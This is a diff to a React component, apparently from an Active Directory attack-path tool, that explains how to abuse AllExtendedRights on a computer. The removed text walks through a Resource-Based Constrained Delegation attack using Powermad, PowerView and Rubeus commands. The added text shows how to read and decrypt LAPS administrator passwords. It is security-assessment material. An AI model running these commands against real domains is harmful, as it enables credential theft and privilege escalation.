@@ -14,17 +14,11 @@
 //
 // SPDX-License-Identifier: Apache-2.0
 
+import { Link, Typography } from '@mui/material';
 import { FC } from 'react';
-import { Typography } from '@mui/material';
 import { EdgeInfoProps } from '../index';
 
-const WindowsAbuse: FC<EdgeInfoProps & { haslaps: boolean }> = ({
-    sourceName,
-    sourceType,
-    targetName,
-    targetType,
-    haslaps,
-}) => {
+const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName, targetType }) => {
     switch (targetType) {
         case 'User':
             return (
@@ -88,167 +82,62 @@ const WindowsAbuse: FC<EdgeInfoProps & { haslaps: boolean }> = ({
                 </>
             );
         case 'Computer':
-            if (haslaps) {
-                return (
-                    <>
-                        <Typography variant='body2'>
-                            The AllExtendedRights permission grants {sourceName} the ability to obtain the LAPS (RID 500
-                            administrator) password of {targetName}. {sourceName} can do so by listing a computer
-                            object's AD properties with PowerView using Get-DomainComputer {targetName}. The value of
-                            the ms-mcs-AdmPwd property will contain password of the administrative local account on{' '}
-                            {targetName}.
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            Alternatively, AllExtendedRights on a computer object can be used to perform a
-                            Resource-Based Constrained Delegation attack.
-                        </Typography>
-
-                        <Typography variant='body1'> Resource-Based Constrained Delegation attack </Typography>
-
-                        <Typography variant='body2'>
-                            Abusing this primitive is possible through the Rubeus project.
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            First, if an attacker does not control an account with an SPN set, Kevin Robertson's
-                            Powermad project can be used to add a new attacker-controlled computer account:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {
-                                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
-                            }
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            PowerView can be used to then retrieve the security identifier (SID) of the newly created
-                            computer account:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
-                            objectsid
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            We now need to build a generic ACE with the attacker-added computer SID as the principal,
-                            and get the binary bytes for the new DACL/ACE:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
-                                '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
-                                '$SD.GetBinaryForm($SDBytes, 0)'}
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            Next, we need to set this newly created security descriptor in the
-                            msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over,
-                            again using PowerView in this case:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {
-                                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
-                            }
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
-                        </Typography>
-
-                        <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>
-
-                        <Typography variant='body2'>
-                            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name
-                            (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt),
-                            and in this case grants us access to the file system of the TARGETCOMPUTER:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {
-                                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
-                            }
-                        </Typography>
-                    </>
-                );
-            } else {
-                return (
-                    <>
-                        <Typography variant='body2'>
-                            AllExtendedRights on a computer object can be used to perform a Resource-Based Constrained
-                            Delegation attack.
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            Abusing this primitive is possible through the Rubeus project.
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            First, if an attacker does not control an account with an SPN set, Kevin Robertson's
-                            Powermad project can be used to add a new attacker-controlled computer account:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {
-                                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
-                            }
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            PowerView can be used to then retrieve the security identifier (SID) of the newly created
-                            computer account:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
-                            objectsid
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            We now need to build a generic ACE with the attacker-added computer SID as the principal,
-                            and get the binary bytes for the new DACL/ACE:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
-                                '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
-                                '$SD.GetBinaryForm($SDBytes, 0)'}
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            Next, we need to set this newly created security descriptor in the
-                            msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over,
-                            again using PowerView in this case:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {
-                                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
-                            }
-                        </Typography>
-
-                        <Typography variant='body2'>
-                            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
-                        </Typography>
-
-                        <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>
-
-                        <Typography variant='body2'>
-                            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name
-                            (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt),
-                            and in this case grants us access to the file system of the TARGETCOMPUTER:
-                        </Typography>
-
-                        <Typography component={'pre'}>
-                            {
-                                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
-                            }
-                        </Typography>
-                    </>
-                );
-            }
+            return (
+                <>
+                    <Typography variant='body2'>
+                        The AllExtendedRights permission allows {sourceName} to retrieve the LAPS (RID 500
+                        administrator) password for {targetName}.
+                    </Typography>
+                    <Typography variant='body2'>
+                        For systems using legacy LAPS, the following AD computer object properties are relevant:
+                        <br />
+                        <b>- ms-Mcs-AdmPwd</b>: The plaintext LAPS password
+                        <br />
+                        <b>- ms-Mcs-AdmPwdExpirationTime</b>: The LAPS password expiration time
+                        <br />
+                    </Typography>
+                    <Typography variant='body2'>
+                        For systems using Windows LAPS (2023 edition), the following AD computer object properties are
+                        relevant:
+                        <br />
+                        <b>- msLAPS-Password</b>: The plaintext LAPS password
+                        <br />
+                        <b>- msLAPS-PasswordExpirationTime</b>: The LAPS password expiration time
+                        <br />
+                        <b>- msLAPS-EncryptedPassword</b>: The encrypted LAPS password
+                        <br />
+                        <b>- msLAPS-EncryptedPasswordHistory</b>: The encrypted LAPS password history
+                        <br />
+                        <b>- msLAPS-EncryptedDSRMPassword</b>: The encrypted Directory Services Restore Mode (DSRM)
+                        password
+                        <br />
+                        <b>- msLAPS-EncryptedDSRMPasswordHistory</b>: The encrypted DSRM password history
+                        <br />
+                    </Typography>
+                    <Typography variant='body2'>
+                        Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:
+                    </Typography>
+                    <Typography component={'pre'}>
+                        {
+                            'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'
+                        }
+                    </Typography>
+                    <Typography variant='body2'>
+                        Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:
+                    </Typography>
+                    <Typography component={'pre'}>{'Get-LapsADPassword "WIN10" -AsPlainText'}</Typography>
+                    <Typography variant='body2'>
+                        The encrypted attributes can also be retrieved and decrypted using{' '}
+                        <Link
+                            target='_blank'
+                            rel='noopener'
+                            href='https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt'>
+                            lapsv2decrypt
+                        </Link>{' '}
+                        (dotnet or BOF).
+                    </Typography>
+                </>
+            );
         case 'Domain':
             return (
                 <Typography variant='body2'>
